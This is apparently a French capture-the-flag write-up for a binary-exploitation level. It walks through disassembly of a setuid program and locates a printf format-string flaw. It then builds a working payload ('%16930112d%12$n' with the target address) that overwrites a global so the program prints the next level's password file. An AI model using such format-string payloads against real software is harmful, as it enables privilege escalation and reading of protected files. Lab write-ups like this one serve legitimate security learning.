# level4

## Objectif

Exploiter le binaire `level4` pour lire `/home/user/level5/.pass`.

Même famille que level3 (faille de chaîne de format → écrire dans une globale
pour déclencher `system`), avec deux différences : la faille est un cran plus
profond, et la valeur à écrire est énorme.

## 1. Repérer la faille

`main` appelle `n`, qui lit l'entrée puis la passe à `p` :

```asm
; --- n ---
0x0804847a <+35>:  call   0x8048350 <fgets@plt>   ; fgets(buffer, 512, stdin)
0x0804847f <+40>:  lea    -0x208(%ebp),%eax
0x08048485 <+46>:  mov    %eax,(%esp)
0x08048488 <+49>:  call   0x8048444 <p>           ; p(buffer)
```

```asm
; --- p ---
0x0804844a <+6>:   mov    0x8(%ebp),%eax           ; eax = argument de p (= le buffer)
0x0804844d <+9>:   mov    %eax,(%esp)
0x08048450 <+12>:  call   0x8048340 <printf@plt>   ; printf(buffer)  <-- faille
```

**Différence avec level3 :** le `printf` vulnérable est appelé depuis `p`
(un niveau de plus dans la pile), donc la position de notre saisie ne sera plus
la même → il faudra la re-sonder.

## 2. La condition à remplir

```asm
0x0804848d <+54>:  mov    0x8049810,%eax           ; eax = m (variable globale)
0x08048492 <+59>:  cmp    $0x1025544,%eax          ; m == 0x1025544 ?
0x08048497 <+64>:  jne    0x80484a5 <n+78>         ; non -> fin
0x08048499 <+66>:  movl   $0x8048590,(%esp)        ; argument de system
0x080484a0 <+73>:  call   0x8048360 <system@plt>   ; system(...)
```

Il faut que la globale **`m` (`0x8049810`)** vaille **`0x1025544` = 16 930 116**.
Rien ne la modifie normalement → on la force via la faille de format.

L'argument de `system` est à `0x8048590` :

```sh
(gdb) x/s 0x8048590
0x8048590:  "/bin/cat /home/user/level5/.pass"
```

Ce n'est donc **pas** `/bin/sh` : quand `m` atteint la bonne valeur, le programme
exécute directement `cat` sur le `.pass` de level5 et **affiche le flag** (pas de
shell interactif à ouvrir). Le binaire étant setuid `level5`, le `cat` s'exécute
avec ces droits et peut lire le fichier.

## 3. Trouver la position de notre saisie sur la pile

```sh
python -c 'print "AAAA" + ".%x"*15' | ./level4
```

```
AAAA.b7ff26b0.bffff6a4.b7fd0ff4.0.0.bffff668.804848d.bffff460.200.b7fd1ac0.b7ff37d0.41414141...
       (1)      (2)       (3)   (4)(5) (6)      (7)       (8)    (9)  (10)      (11)     (12)
```

Le `41414141` (= `AAAA`) apparaît au **12ᵉ** → le début de notre saisie est
l'argument n°12 vu par `printf`.

## 4. Construire le payload

On veut écrire **16 930 116** dans `m`. Comme la position (12) est loin, on
utilise l'**accès direct** `%12$n` au lieu de 11 paddings avec `%x` comme au level3.

Structure : `[adresse de m][padding][%12$n]`

- `\x10\x98\x04\x08` → adresse de `m` (little-endian) ; 4 caractères, position 12.
- `%16930112d` → affiche un mot de pile paddé sur `16 930 116 - 4 = 16 930 112`
  caractères.
- `%12$n` → écrit le compteur (`4 + 16 930 112 = 16 930 116`) à l'adresse en
  position 12 = `m`.

Rappels :
- `%N$n` vise **directement** l'argument N (contrairement au `%n` séquentiel dont
  la position dépend du nombre de conversions qui le précèdent).
- L'adresse contient des octets non imprimables → il faut la générer (python,
  `printf`…), on ne peut pas la taper au clavier.

## 5. Exécuter et récupérer le flag

```sh
(printf '\x10\x98\x04\x08%%16930112d%%12$n'; cat) | ./level4
```

Le flag récupéré est à reporter dans le fichier `flag`.

## Nature de la faille

Faille de chaîne de format : `printf(buffer)` utilise une entrée contrôlée comme
format. Via `%12$n` (accès direct à l'argument 12, où l'on a placé l'adresse de
`m`) et un padding géant, on écrit `0x1025544` dans la globale `m`, ce qui
satisfait la condition `m == 0x1025544` et déclenche le
`system("/bin/cat /home/user/level5/.pass")` présent dans le binaire.
